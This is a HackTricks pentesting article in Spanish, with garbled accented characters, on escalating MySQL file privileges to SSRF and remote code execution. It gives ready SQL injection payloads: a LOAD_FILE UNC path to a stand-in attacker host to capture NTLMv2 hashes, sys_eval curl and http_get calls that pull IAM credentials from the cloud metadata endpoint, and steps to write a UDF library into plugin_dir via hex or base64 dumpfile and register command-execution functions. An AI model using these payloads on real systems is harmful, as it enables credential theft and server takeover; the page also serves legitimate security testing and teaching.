# Privilegio de archivo MySQL a SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML a SSRF

Cada art√≠culo de exfiltraci√≥n de datos SQL Out of Band utilizar√° la funci√≥n de cadena `LOAD_FILE()` para realizar una solicitud de red. La funci√≥n en s√≠ tiene sus propias limitaciones basadas en el sistema operativo en el que se ejecuta y en la configuraci√≥n con la que se inici√≥ la base de datos.

Por ejemplo, si la variable global `secure_file_priv` no se estableci√≥, el [valor predeterminado se establece en `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), lo que significa que solo se pueden usar funciones como `LOAD_FILE('nombre_archivo')` o `LOAD DATA [LOCAL] INFILE 'nombre_archivo' INTO TABLE nombre_tabla` para leer archivos del directorio `/var/lib/mysql-files/`. Para poder realizar lecturas en archivos fuera de este directorio, la opci√≥n `secure_file_priv` debe establecerse en `""`, lo cual solo se puede hacer actualizando el archivo de configuraci√≥n de la base de datos o pasando el par√°metro de inicio `--secure_file_priv=""` al servicio de la base de datos.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

Sin embargo, en circunstancias en las que `secure_file_priv` se establece en `""`, deber√≠amos poder leer otros archivos en el sistema, asumiendo que se tienen permisos de lectura de archivos y `file_priv` se establece en `Y` en `mysql.user` para el usuario de la base de datos actual. Sin embargo, poder usar estas funciones para realizar llamadas de red depende mucho del sistema operativo. Como estas funciones est√°n dise√±adas solo para leer archivos, las √∫nicas llamadas relevantes para la red que se pueden realizar son a rutas UNC en hosts de Windows, ya que [la API de Windows `CreateFileA` que se llama al acceder a un archivo comprende las convenciones de nomenclatura UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Entonces, si la base de datos objetivo se est√° ejecutando en una m√°quina Windows, la consulta de inyecci√≥n `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` [resultar√≠a en que la m√°quina Windows env√≠e hashes NTLMv2 en un intento de autenticarse con el `\\attackerserver.example.com` controlado por el atacante](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html).

Esta t√©cnica de falsificaci√≥n de solicitud del lado del servidor (SSRF), aunque √∫til, est√° restringida solo al puerto TCP 445. No se puede controlar el n√∫mero de puerto, pero se puede leer informaci√≥n de recursos compartidos configurados con privilegios de lectura completos. Adem√°s, como se ha demostrado en investigaciones anteriores, se puede utilizar esta capacidad limitada de SSRF para robar hashes y transmitirlos para obtener shells, por lo que definitivamente es √∫til.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/3.png)

### Funciones definidas por el usuario para RCE

Otra t√©cnica interesante con bases de datos MySQL es la capacidad de utilizar Funciones Definidas por el Usuario (UDF, por sus siglas en ingl√©s) presentes en archivos de bibliotecas externas que, si est√°n presentes en ubicaciones espec√≠ficas o en la variable $PATH del sistema, se pueden acceder desde MySQL.

Podr√≠as usar una inyecci√≥n SQL para **escribir una biblioteca (`.so` o `.dll`** dependiendo de Linux o Windows), que contenga una Funci√≥n Definida por el Usuario que pueda realizar solicitudes de red/HTTP, y que luego se pueda invocar a trav√©s de consultas adicionales.

Sin embargo, esto tiene sus propias restricciones. Seg√∫n la versi√≥n de MySQL, que se puede identificar con `select @@version`, el directorio desde el cual se pueden cargar los complementos est√° restringido. MySQL anterior a `v5.0.67` permit√≠a cargar archivos de biblioteca desde la ruta del sistema si la variable `plugin_dir` no estaba configurada. Esto ha cambiado y las versiones m√°s recientes tienen la variable **`plugin_dir`** configurada en algo como `/usr/lib/mysql/plugin/`, que generalmente es propiedad de root.

B√°sicamente, **para cargar una biblioteca personalizada en MySQL y llamar a una funci√≥n de la biblioteca cargada a trav√©s de una inyecci√≥n SQL, necesitar√≠as**:

* la capacidad de **escribir en la ubicaci√≥n** especificada en **`@@plugin_dir`** a trav√©s de una inyecci√≥n SQL
* **`file_priv`** establecido en **`Y`** en `mysql.user` para el usuario de la base de datos actual
* **`secure_file_priv`** establecido en **`""`** para poder leer los bytes sin procesar de la biblioteca desde una ubicaci√≥n arbitraria como la red o un directorio de carga de archivos en una aplicaci√≥n web.

Suponiendo que se cumplan las condiciones anteriores, puedes usar el **enfoque cl√°sico de transferir la** [**popular biblioteca UDF de MySQL `lib_mysqludf_sys`**](https://github.com/mysqludf/lib\_mysqludf\_sys) **al servidor de la base de datos**. Luego podr√≠as realizar solicitudes de comandos del sistema operativo como `cURL` o `powershell wget` para realizar SSRF utilizando la sintaxis

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Hay muchas otras funciones declaradas en esta biblioteca, cuyo an√°lisis se puede ver [aqu√≠](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). Si eres como yo y eres perezoso, puedes obtener una copia de esta biblioteca UDF, para el sistema operativo objetivo, desde una instalaci√≥n de Metasploit en el directorio `/usr/share/metasploit-framework/data/exploits/mysql/` y comenzar a usarla.

Alternativamente, se han creado bibliotecas UDF espec√≠ficamente para proporcionar a la base de datos la capacidad de realizar solicitudes HTTP. Puedes usar [MySQL User-defined function (UDF) for HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) para hacer que la base de datos realice solicitudes HTTP, utilizando la siguiente sintaxis

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Tambi√©n podr√≠as [crear tu propia UDF y usarla para la post-explotaci√≥n.](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)
En cualquier caso, necesitas transferir la biblioteca al servidor de la base de datos. Puedes hacerlo de varias formas:

1. Utiliza la funci√≥n de cadena `hex()` de MySQL o algo como `xxd -p filename.so | tr -d '\n'` para convertir el contenido de la biblioteca a formato hexadecimal y luego volcarlo en el directorio `@@plugin_dir` utilizando `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternativamente, convierte el contenido de `filename.so` a base64 y utiliza `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

Si el `@@plugin_dir` no es escribible, entonces est√°s de mala suerte si la versi√≥n es superior a `v5.0.67`. De lo contrario, escribe en una ubicaci√≥n diferente que est√© en la ruta y carga la biblioteca UDF desde all√≠ utilizando:

* para la biblioteca `lib_mysqludf_sys` - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* para la biblioteca `mysql-udf-http` - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/4.png)

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/5.png)

Para automatizar esto, puedes utilizar SQLMap que admite [el uso de UDF personalizadas a trav√©s de la opci√≥n `--udf-inject`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Para inyecciones de SQL ciegas, puedes redirigir la salida de las funciones UDF a una tabla temporal y luego leer los datos desde all√≠ o utilizar [una solicitud DNS oculta dentro de un comando curl `sys_eval` o `sys_exec`](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
